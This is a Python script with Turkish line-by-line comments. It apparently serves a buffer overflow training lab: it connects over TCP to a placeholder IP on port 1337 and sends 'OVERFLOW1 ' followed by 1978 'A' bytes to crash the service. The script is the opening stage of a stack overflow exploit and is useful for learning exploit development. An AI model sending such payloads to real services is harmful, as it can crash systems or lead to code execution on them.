#!/usr/bin/env python3
# Bu satır, Python betiğinin hangi ortamda çalıştırılacağını belirtir. Python 3 ile çalıştırılacak.

import sys 
import time 
import socket

# 'sys' modülü: Betik çalıştırıldığında sistem ile ilgili işlemleri yönetmek için kullanılır (örneğin, çıkış yapmak).
# 'time' modülü: Bekleme ve zamanlama işlemleri için kullanılır.
# 'socket' modülü: Ağ bağlantılarını kurmak ve veri transferi yapmak için kullanılır.

ip = "IP_ADDRESS"  # Test edilecek hedefin IP adresi. Bu adresi değiştirmelisiniz.
port = 1337  # Bağlanılacak hizmetin port numarası. 1337 burada hedef hizmetin çalıştığı portu temsil ediyor. Bu portu da ihtiyacınıza göre değiştirmelisiniz.
timeout = 5  # Bağlantı zaman aşımı süresi 5 saniye olarak ayarlanmış. Eğer hedef 5 saniye içinde yanıt vermezse bağlantı başarısız olacak.

prefix = "OVERFLOW1 "  # Hedefe gönderilecek verinin başına eklenen özel bir ön ek. Genelde belirli bir komut veya formatı temsil eder. Bu, saldırıya veya teste özgü olabilir.
string = prefix + "A"*1978  
# Hedefe gönderilecek veri dizisi. Burada 1978 tane 'A' karakteri eklenmiş. 
# 'prefix' ile başlıyor ve toplamda 1978 baytlık 'A' karakterleri içeriyor. Bu, muhtemelen buffer overflow testleri için kullanılıyor.

try:
    # Hata oluşmazsa çalıştırılacak kodlar bu blok içinde yer alıyor.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Bir TCP bağlantısı kuruluyor. 'AF_INET' IPv4 adresleme, 'SOCK_STREAM' ise TCP protokolü kullanıldığını ifade ediyor.
        s.settimeout(timeout)
        # Bağlantı zaman aşımı 5 saniye olarak ayarlanıyor.
        s.connect((ip, port))
        # Belirtilen IP adresi ve port numarasıyla TCP bağlantısı kuruluyor.
        s.send(bytes(string, "latin-1"))
        # 'string' değişkeni içindeki veriler hedefe gönderiliyor. Veriler "latin-1" karakter setiyle kodlanıyor. Bu karakter seti, tek baytlı karakterler kullanarak veriyi iletir.

except:
    # Eğer yukarıdaki işlemler sırasında herhangi bir hata meydana gelirse (örn. bağlantı hatası), bu blok çalışacak.
    print("Bağlanılamadı")
    # Ekrana "Could not connect" (Bağlanılamadı) mesajı yazdırılıyor. Bu genellikle bağlantı kurulamaması durumunda olur.
